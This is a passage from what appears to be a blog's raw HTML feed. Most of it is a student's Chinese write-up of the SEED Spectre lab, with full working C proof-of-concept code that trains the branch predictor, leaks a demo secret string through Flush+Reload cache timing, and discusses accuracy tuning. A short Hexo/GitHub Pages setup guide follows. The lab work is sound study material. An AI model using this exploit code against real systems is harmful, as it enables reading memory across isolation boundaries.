class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)buffer);  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret: %p \n&quot;</span>, secret);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;buffer: %p \n&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index of secret (out of bound): %ld \n&quot;</span>, index_beyond);</span><br><span class="line">  spectreAttack(index_beyond);</span><br><span class="line">  reloadSideChannel();</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>创建数组并清除缓存</li><li>训练CPU。此时要使CPU能走向正常访问的if分支。</li><li>清除if判断条件的缓存和数组缓存</li><li>访问一个超出限制条件的值，再重新加载数组并计算时间。</li></ol><p>编译命令，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc SpectreAttack.c -o t4</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>运行结果显示Secret被成功读取到了（一个字节）：S。</p><p>83为S的ASCII编码值。</p><p><strong>但是为什么array[0*4096+1024]也会在CPU缓存中呢？</strong></p><p><strong>原因如下：</strong></p><p>当CPU首先执行了分支预测的时候，返回的s值为index_beyond地址上的值，如果这时还未回滚，那么 array[s*4096+1024]将被访问，也就是说它会被存入CPU缓存，我们可以通过侧信道的方式读取到它。</p><p>但是由于index_beyond始终都在buffer的合法访问之外，所以CPU始终都会回滚，也就是说，s最终都会返回0，array[0*4096+1024]始终都会被CPU访问。这也是Task5中的初始的代码出问题的原因，scorces[0]的值每一次都会+1。</p><p>如果在正确结果回滚之前，CPU没有对<code>array[s*4096+1024]</code>进行访问，那么只有<code>array[0*4096+1024]</code>会被写入缓存，攻击程序无法读取到正确的secret。</p><h2 id="Task5-Improve-the-Attack-Accuracy"><a href="#Task5-Improve-the-Attack-Accuracy" class="headerlink" title="Task5. Improve the Attack Accuracy"></a>Task5. Improve the Attack Accuracy</h2><p>在之前的task中，可能会观察到结果确实存在一些噪音，并且结果并不总是准确的。这是因为 CPU 有时会在缓存中加载额外的值，希望稍后会使用它，或者阈值不是很准确。缓存中的噪音会影响我们的攻击结果。我们需要多次执行攻击；我们可以使用以下代码自动执行任务，而不是手动执行。</p><p>**我们使用统计技术。这个想法是创建一个大小为 256 的分数数组，每个可能的秘密值都有一个元素。<strong>然后我们多次进行攻击。每次，如果我们的攻击程序说 k 是秘密（这个结果可能是假的），我们就会在 scores[k] 上加 1。在多次运行攻击后，我们使用</strong>得分最高的 k 值作为我们对秘密的最终估计。**这将产生比基于单次运行的估计更可靠的估计。修改后的代码如下所示，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">uint8_t</span> temp    = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>    *secret = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    restrictedAccess(i);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower); </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;  &#125;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)buffer);</span><br><span class="line"></span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****\n&quot;</span>);  <span class="comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">    spectreAttack(index_beyond);</span><br><span class="line">    usleep(<span class="number">10</span>);</span><br><span class="line">    reloadSideChannelImproved();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(scores[max] &lt; scores[i]) max = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The secret value is %d(%c)\n&quot;</span>, max, max);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实验步骤：</strong></p><p>编译并运行<code>SpectreAttackImproved.c</code>，并且完成下列小task：</p><p>编译命令为，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc SpectreAttackImproved.c -o t5</span><br></pre></td></tr></table></figure><h3 id="Task5-1"><a href="#Task5-1" class="headerlink" title="Task5.1"></a>Task5.1</h3><p><strong>1.</strong> 直接编译运行程序后，会发现scores数组中scores[0]的值是最大的，请解释原因，并且修改上面的代码，使得程序打印出真正的秘密值。</p><p>运行程序，输出结果：</p><p><strong>原因：</strong></p><p>因为对buffer[index_beyond]的访问最终都会失败的；函数返回的值最终还是为0，也就是说，<code>array[0*4096+1024]</code>永远都会被放入CPU缓存，对scores [0]计数是无意义的（除非秘密值为0）。</p><p><strong>修改代码：</strong></p><p>在寻找<strong>scores</strong>数组中最大值索引的时候忽略0索引，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(scores[max] &lt; scores[i]) max = i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;score[%d]:%d\n&quot;</span>,i,scores[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译运行：发现可以得到正确的secret。</p><h3 id="Task5-2"><a href="#Task5-2" class="headerlink" title="Task5.2"></a>Task5.2</h3><p><strong>2.</strong> 第①行看起来没用，但从实验作者说在 SEED Ubuntu 20.04 上的经验来看，如果没有这一行，攻击将无法进行。在 SEED Ubuntu 16.04 VM 上，不需要此行。暂时还没有弄清楚确切的原因。请运行带有或不带有此行的程序，并描述您的观察结果。</p><p><strong>实验步骤：</strong></p><p>刚才已经运行了没注释第①行的程序，并且给出了运行结果，</p><p>下面注释掉这一行，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">  <span class="comment">//printf(&quot;*****\n&quot;);  // This seemly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">  spectreAttack(index_beyond);</span><br><span class="line">  usleep(<span class="number">10</span>);</span><br><span class="line">  reloadSideChannelImproved();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下，scores数组中的每一个数（除了scores[0]）都是0，即CPU并没有执行那一条分支预测，</p><p><strong>猜测</strong>：可能是多了一条IO语句，对程序执行时间产生延迟（从而CPU就会使用乱序执行，以提升计算资源的利用率），就跟下面的<code>usleep(10);</code>函数一样，不同操作系统对IO的操作不一样，所以会导致结果不同，</p><h3 id="Task5-3"><a href="#Task5-3" class="headerlink" title="Task5.3"></a>Task5.3</h3><p><strong>3.</strong> 第②行使得程序休眠10微妙，程序休眠的时间长短确实会影响攻击的成功率。请尝试其他几个值，并描述观察结果。</p><p><strong>实验步骤：</strong></p><p>休眠10微妙，命中数20，</p><p>休眠100微妙，命中数46，</p><p>休眠1000微妙，命中数127，</p><p>休眠10000微妙（0.01秒），命中数5，</p><p>休眠30000微妙（0.03秒），命中数0，</p><p>休眠50000微妙（0.05秒），命中数0，</p><p><strong>现象描述</strong>：随着休眠时间的不断变长，命中数先增加，后减少，直至为0，</p><p><strong>分析</strong>：</p><ul><li>刚开始增加休眠时间时，比10微秒长的休眠时间（ <code>usleep</code> 时间）可能导致乱序执行和指令重排的影响更加显著，使得CPU在乱序执行时，缓存内存入的数据更多，</li><li>乱序执行的结果并不是无限期保留的。处理器会设置一些限制来确保乱序执行的结果在一定时间内被放弃，以避免对系统的影响过大。如果休眠时间过长，<u><em><strong>那么处理器可能会在攻击者观察前完成秘密值缓存的读取或者缓存中的数据可能已经被替换掉。</strong></em></u><ul><li>当休眠时间过一定了的阈值后再继续增加，scores[83]的值就普遍开始减小了，当休眠时间再增加，可能成功率（命中数）就会变为0。</li></ul></li></ul><h2 id="Task6-Steal-the-Entire-Secret-String"><a href="#Task6-Steal-the-Entire-Secret-String" class="headerlink" title="Task6. Steal the Entire Secret String"></a>Task6. Steal the Entire Secret String</h2><p>在上一个task中，我们只读取秘密字符串的第一个字符。在此任务中，我们需要使用 Spectre 攻击打印出整个字符串。</p><p><strong>实验步骤：</strong></p><p>编写task6.c，并修改一个新的secret：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> buffer_size = <span class="number">10</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;i am wuzhenghan!!!!&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; buffer_size) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> larger_x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    _mm_clflush(&amp;buffer_size);</span><br><span class="line">    <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123; &#125;</span><br><span class="line">    restrictedAccess(i);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Flush buffer_size and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;buffer_size);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123; &#125;</span><br><span class="line">  s = restrictedAccess(larger_x);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x&lt;<span class="number">17</span>; x++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(scores, <span class="number">0</span>, <span class="keyword">sizeof</span>(scores));</span><br><span class="line">    <span class="type">size_t</span> larger_x = (<span class="type">size_t</span>)(secret-(<span class="type">char</span>*)buffer + x);</span><br><span class="line">    flushSideChannel();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">      spectreAttack(larger_x);</span><br><span class="line">      reloadSideChannelImproved();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">     <span class="keyword">if</span>(scores[max] &lt; scores[i])  </span><br><span class="line">       max = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at %p = &quot;</span>, (<span class="type">void</span>*)larger_x);</span><br><span class="line">    usleep(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The  secret value is %d \t %c\n&quot;</span>, max,max);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要读取所秘密字符串的所有值，那就写一个循环，依次下一个字符。之前的只是输出命中的内存块的索引，通过改进Task4的代码我们可以输出字符串，除了第一个字符其他都能打印出来。</p><p>具体改进是通过for循环从secret头指针开始偏移，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> larger_x = (<span class="type">size_t</span>)(secret-(<span class="type">char</span>*)buffer + x);</span><br></pre></td></tr></table></figure><p>对每一个字符发起幽灵攻击然后再重新加载并计算时间就可以得到命中的地址及其具体值，转为字符，连起来就是secret字符串，结果如图所示，</p><p>或者上述代码的基础上修改，实现整行输出，</p><p>修改如下，</p><ul><li>定义了一个res字符串数组，可用长度为20，用于存放攻击程序读取到的字符串。</li><li>然后循环读取秘密字符串中的字符，读取20个，然后清空scores数组。</li><li>循环结束之后打印res数组即可</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)buffer);</span><br><span class="line">    <span class="type">char</span> res[<span class="number">21</span>];</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, <span class="number">21</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">20</span>; j++) &#123;</span><br><span class="line">        flushSideChannel();</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) scores[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;******\n&quot;</span>);  <span class="comment">// This seemingly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">            spectreAttack(index_beyond + j);</span><br><span class="line">            usleep(<span class="number">10</span>);</span><br><span class="line">            reloadSideChannelImproved();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(scores[max] &lt; scores[i]) max = i;</span><br><span class="line">            <span class="comment">// printf(&quot;score[%d]:%d\n&quot;, i, scores[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">        res[j] = max;  <span class="comment">// 逐个写入res字符串数组</span></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            scores[i] = <span class="number">0</span>;  <span class="comment">// 记得清零</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;secret:%s&quot;</span>, res);</span><br></pre></td></tr></table></figure><p>结果如下所示，</p><h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><h3 id="Flush-Reload技术"><a href="#Flush-Reload技术" class="headerlink" title="Flush-Reload技术"></a>Flush-Reload技术</h3><ol><li>刷新处理器缓存</li><li>访问存储器秘密s位置</li><li>重新加载，检查缓存中的s是哪一个</li></ol>]]></content>
      
      
      <categories>
          
          <category> SCU </category>
          
          <category> 2024-2025学年 </category>
          
          <category> 网络攻防技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+GithubPages建站</title>
      <link href="/blog/2025/01/15/%E5%85%B6%E4%BB%96/Hexo%E5%BB%BA%E7%AB%99/Hexo/"/>
      <url>/blog/2025/01/15/%E5%85%B6%E4%BB%96/Hexo%E5%BB%BA%E7%AB%99/Hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="0-Hexo-Github-Pages"><a href="#0-Hexo-Github-Pages" class="headerlink" title="0. Hexo+Github_Pages"></a>0. Hexo+Github_Pages</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><h3 id="什么是Github-Pages"><a href="#什么是Github-Pages" class="headerlink" title="什么是Github_Pages"></a>什么是Github_Pages</h3><p>GitHub Pages 可以将我们托管在 GitHub 上的一个仓库中的 html、css 和 js 代码渲染成静态页面。当然，这个仓库是特殊的，所以每一个 GitHub 账户只能够育一个这样的仓库。将相应的博客内容上传到 GitHub 上之后，我们就可以通过 <code>https://www.username.github.io</code> 来访问自己的博客，这里的 <code>username</code> 要换成自己的用户名。</p><h3 id="什么是Hexo"><a href="#什么是Hexo" class="headerlink" title="什么是Hexo"></a>什么是Hexo</h3><p>Hexo 是使用 nodejs 开发的一个快速、简洁、高效的静态博客生成器。Hexo 使用 Markdown 语法解析文章，然后渲染成相应的网页，然后我们将渲染好的网页代码上传到 GitHub 上就可以了。简单来讲，利用 Hexo，我们只需要使用 Markdown 语法写文章，剩下的事情全部交给 Hexo 去做，我们就可以看到想要的博客效果了。</p></blockquote><p>配置这个你需要</p><ul><li>Git&amp;Github</li><li>nodejs&amp;npm</li><li>hexo</li></ul><h1 id="1-安装-Hexo"><a href="#1-安装-Hexo" class="headerlink" title="1. 安装 Hexo"></a>1. 安装 Hexo</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>终端执行<code>hexo -version</code>出现 Hexo 版本号，说明安装成功</p><h1 id="2-本地建站"><a href="#2-本地建站" class="headerlink" title="2. 本地建站"></a>2. 本地建站</h1><h2 id="2-1-初始化"><a href="#2-1-初始化" class="headerlink" title="2.1. 初始化"></a>2.1. 初始化</h2><p>找到要存放博客的目录，进入终端执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init blogs</span><br><span class="line"><span class="built_in">cd</span> blogs</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p><code>_config.yml</code> 存放的是博客配置信息， <code>source/_posts</code> 是存放文章的地方。</p><h2 id="2-2-预览"><a href="#2-2-预览" class="headerlink" title="2.2. 预览"></a>2.2. 预览</h2><p>打开终端，进入项目根目录执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo c <span class="comment"># 清除缓存文件，建议写完文章后执行一次</span></span><br><span class="line">hexo g<span class="comment"># 生成 public 文件夹，写完文章执行</span></span><br><span class="line">hexo s<span class="comment"># 启动 hexo 服务</span></span><br></pre></td></tr></table></figure><p>浏览器访问 <a href="http://localhost:4000/">http://localhost:4000/</a> 出现下图说明启动成功</p><h2 id="2-3-更换主题"><a href="#2-3-更换主题" 